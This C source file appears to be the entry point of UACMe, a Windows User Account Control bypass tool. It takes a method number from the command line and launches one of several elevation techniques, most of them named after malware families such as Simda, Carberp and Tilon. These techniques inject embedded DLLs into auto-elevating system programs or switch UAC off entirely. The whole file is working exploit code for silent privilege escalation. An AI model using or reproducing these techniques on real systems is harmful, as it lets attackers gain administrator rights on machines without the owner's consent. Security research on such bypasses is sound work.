/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2015
*
*  TITLE:       MAIN.C
*
*  VERSION:     1.90
*
*  DATE:        17 Sept 2015
*
*  Injector entry point.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include <VersionHelpers.h>

#ifdef _WIN64
#include "hibiki64.h"
#include "fubuki64.h"
#define INJECTDLL Fubuki64
#define AVRFDLL	Hibiki64
#else
#include "hibiki32.h"
#include "fubuki32.h"
#define INJECTDLL Fubuki32
#define AVRFDLL Hibiki32
#endif

#if (_MSC_VER >= 1900) 
#ifdef _DEBUG
#pragma comment(lib, "vcruntimed.lib")
#pragma comment(lib, "ucrtd.lib")
#else
#pragma comment(lib, "libvcruntime.lib")
#endif
#endif

#define PROGRAMTITLE TEXT("UACMe")
#define WOW64STRING TEXT("Apparently it seems you are running under WOW64.\n\r\
This is not supported, run x64 version of this tool.")
#define WINPRE10 TEXT("This method is only for Windows 7/8/8.1")
#define WINPREBLUE TEXT("This method is only for pre Windows 8.1 use")
#define WINBLUEONLY TEXT("This method is only for Windows 8.1 use")
#define WIN10ONLY TEXT("This method is only for Windows 10 use")
#define WOW64WIN32ONLY TEXT("This method only works from x86-32 Windows or Wow64")
#define LAZYWOW64UNSUPPORTED TEXT("Use 32 bit version of this tool on 32 bit OS version")
#define UAC10FIX TEXT("This method does not work in Windows 10 builds greater than 10136")

/*
* ucmShowMessage
*
* Purpose:
*
* Output message to user.
*
*/
VOID ucmShowMessage(
	LPTSTR lpszMsg
	)
{
	if (lpszMsg) {
		MessageBox(GetDesktopWindow(), 
			lpszMsg, PROGRAMTITLE, MB_ICONINFORMATION);
	}
}

/*
* main
*
* Purpose:
*
* Program entry point.
*
*/
VOID main()
{
	BOOL                    IsWow64 = FALSE;
	DWORD                   bytesIO, dwType, paramLen;
	WCHAR                   *p;
	WCHAR                   szBuffer[MAX_PATH + 1];
	TOKEN_ELEVATION_TYPE    ElevType;
	RTL_OSVERSIONINFOW      osver;


	//query windows version
	if (!supIsWindowsVersionOrGreater(HIBYTE(_WIN32_WINNT_WIN7), LOBYTE(_WIN32_WINNT_WIN7), 0)) {
		ucmShowMessage(TEXT("This Windows is unsupported."));
		goto Done;
	}

	//query build number
	RtlSecureZeroMemory(&osver, sizeof(osver));
	osver.dwOSVersionInfoSize = sizeof(osver);
	if (!NT_SUCCESS(RtlGetVersion(&osver))) {
		goto Done;
	} 

	ElevType = TokenElevationTypeDefault;
	if (!supGetElevationType(&ElevType)) {
		goto Done;
	}
	if (ElevType != TokenElevationTypeLimited) {
		ucmShowMessage(TEXT("Admin account with limited token required."));
		goto Done;
	}

	IsWow64 = supIsProcess32bit(GetCurrentProcess());

	dwType = 0;
	bytesIO = 0;
	RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
	GetCommandLineParam(GetCommandLine(), 1, szBuffer, MAX_PATH, &bytesIO);
	if (bytesIO == 0) {
		goto Done;
	}
	
	dwType = strtoul(szBuffer);
	switch (dwType) {

	case METHOD_SYSPREP1:
		OutputDebugString(TEXT("[UCM] Sysprep cryptbase\n\r"));
		if (osver.dwBuildNumber > 9200) {
			ucmShowMessage(WINPREBLUE);
			goto Done;
		}
		break;

	case METHOD_SYSPREP2:
		OutputDebugString(TEXT("[UCM] Sysprep shcore\n\r"));
		if (osver.dwBuildNumber < 9600) {
			ucmShowMessage(WINBLUEONLY);
			goto Done;
		}
		break;

	case METHOD_SYSPREP3:
		OutputDebugString(TEXT("[UCM] Sysprep dbgcore\n\r"));
		if (osver.dwBuildNumber < 10000) {
			ucmShowMessage(WIN10ONLY);
			goto Done;
		}
		break;

	case METHOD_OOBE:
		OutputDebugString(TEXT("[UCM] Oobe\n\r"));
		break;

	case METHOD_REDIRECTEXE:
		OutputDebugString(TEXT("[UCM] AppCompat RedirectEXE\n\r"));

#ifdef _WIN64
		ucmShowMessage(WOW64WIN32ONLY);
		goto Done;
#endif
		break;

	case METHOD_SIMDA:
		if (osver.dwBuildNumber > 10136) {
			ucmShowMessage(UAC10FIX);
			goto Done;
		}
		OutputDebugString(TEXT("[UCM] Simda\n\r"));
		break;

	case METHOD_CARBERP:
		OutputDebugString(TEXT("[UCM] Carberp\n\r"));
		break;

	case METHOD_CARBERP_EX:
		OutputDebugString(TEXT("[UCM] Carberp_ex\n\r"));
		break;

	case METHOD_TILON:
		OutputDebugString(TEXT("[UCM] Tilon\n\r"));
		if (osver.dwBuildNumber > 9200) {
			ucmShowMessage(WINPREBLUE);
			goto Done;
		}
		break;

	case METHOD_AVRF:
		if (osver.dwBuildNumber > 10136) {
			ucmShowMessage(UAC10FIX);
			goto Done;
		}
		OutputDebugString(TEXT("[UCM] AVrf\n\r"));
		break;

	case METHOD_WINSAT:
		OutputDebugString(TEXT("[UCM] WinSAT\n\r"));
		break;

	case METHOD_SHIMPATCH:
		OutputDebugString(TEXT("[UCM] AppCompat Shim Patch\n\r"));

#ifdef _WIN64
		ucmShowMessage(WOW64WIN32ONLY);
		goto Done;
#endif		
		break;

	case METHOD_MMC:
		OutputDebugString(TEXT("[UCM] MMC \n\r"));
		break;
	}

	//prepare command for payload
	paramLen = 0;
	RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
	GetCommandLineParam(GetCommandLine(), 2, szBuffer, MAX_PATH, &paramLen);
	if (paramLen > 0) {
		if (dwType != METHOD_REDIRECTEXE) {
			supSetParameter((LPWSTR)&szBuffer, paramLen * sizeof(WCHAR));
		}
	}

	switch (dwType) {

	case METHOD_SYSPREP1:
	case METHOD_SYSPREP2:
	case METHOD_SYSPREP3:
	case METHOD_OOBE:
	case METHOD_TILON:

		//
		// Since we are using injection and not using heavens gate/syswow64, we should ban usage under wow64.
		//
#ifndef _DEBUG
		if (IsWow64) {
			ucmShowMessage(WOW64STRING);
			goto Done;
		}
#endif
		if (ucmStandardAutoElevation(dwType, (CONST PVOID)INJECTDLL, sizeof(INJECTDLL))) {
			OutputDebugString(TEXT("[UCM] Standard AutoElevation method called\n\r"));
		}
		break;

//
//  Allow only in 32 version.
//
#ifndef _WIN64
	case METHOD_REDIRECTEXE:
	case METHOD_SHIMPATCH:
		if (ucmAppcompatElevation(dwType, (CONST PVOID)INJECTDLL, sizeof(INJECTDLL), (paramLen != 0) ? szBuffer : NULL )) {
			OutputDebugString(TEXT("[UCM] AppCompat method called\n\r"));
		}
		break;
#endif
	case METHOD_SIMDA:

		//
		// Since we are using injection and not using heavens gate, we should ban usage under wow64.
		//
#ifndef _DEBUG
		if (IsWow64) {
			ucmShowMessage(WOW64STRING);
			goto Done;
		}
#endif
		if (MessageBox(GetDesktopWindow(),
			TEXT("This method will TURN UAC OFF, are you sure? You will need to reenable it after manually."),
			PROGRAMTITLE, MB_ICONQUESTION | MB_YESNO) == IDYES) 
		{
			if (ucmSimdaTurnOffUac()) {
				OutputDebugString(TEXT("[UCM] Simda method called\n\r"));
			}
		}
		break;

	case METHOD_CARBERP:
	case METHOD_CARBERP_EX:

		if (dwType == METHOD_CARBERP) {

			if (osver.dwBuildNumber > 9600) {
				ucmShowMessage(WINPRE10);
				goto Done;
			}

			//there is no migmiz in syswow64 in 8+
			if ((IsWow64) && (osver.dwBuildNumber > 7601)) {
				ucmShowMessage(WOW64STRING);
				goto Done;
			}
		}

		if (dwType == METHOD_CARBERP_EX) {
#ifndef _DEBUG
			if (IsWow64) {
				ucmShowMessage(WOW64STRING);
				goto Done;
			}
#endif
		}

		if (ucmWusaMethod(dwType, (CONST PVOID)INJECTDLL, sizeof(INJECTDLL))) {
			OutputDebugString(TEXT("[UCM] Carberp method called\n\r"));
		}
		break;

	case METHOD_AVRF:
#ifndef _DEBUG
		if (IsWow64) {
			ucmShowMessage(WOW64STRING);
			goto Done;
		}
#endif
		if (ucmAvrfMethod((CONST PVOID)AVRFDLL, sizeof(AVRFDLL))) {
			OutputDebugString(TEXT("[UCM] AVrf method called\n\r"));
		}	
		break;

	case METHOD_WINSAT:
		//
		// Decoding WOW64 environment, turning wow64fs redirection is meeh. Just drop it as it just a test tool.
		//
		if (IsWow64) {
			ucmShowMessage(LAZYWOW64UNSUPPORTED);
			goto Done;
		}

		if (osver.dwBuildNumber < 9200) {
			p = L"powrprof.dll";
		}
		else {
			p = L"devobj.dll";
		}

		if (ucmWinSATMethod(p, (CONST PVOID)INJECTDLL, sizeof(INJECTDLL), (osver.dwBuildNumber <= 10136))) {
			OutputDebugString(TEXT("[UCM] WinSAT method called\n\r"));
		}
		break;

	case METHOD_MMC:

		p = L"elsext.dll";
		if (ucmMMCMethod(p, (CONST PVOID)INJECTDLL, sizeof(INJECTDLL))) {
			OutputDebugString(TEXT("[UCM] MMC method called\n\r"));
		}
		break;
	}
	
Done:
	ExitProcess(0);
}
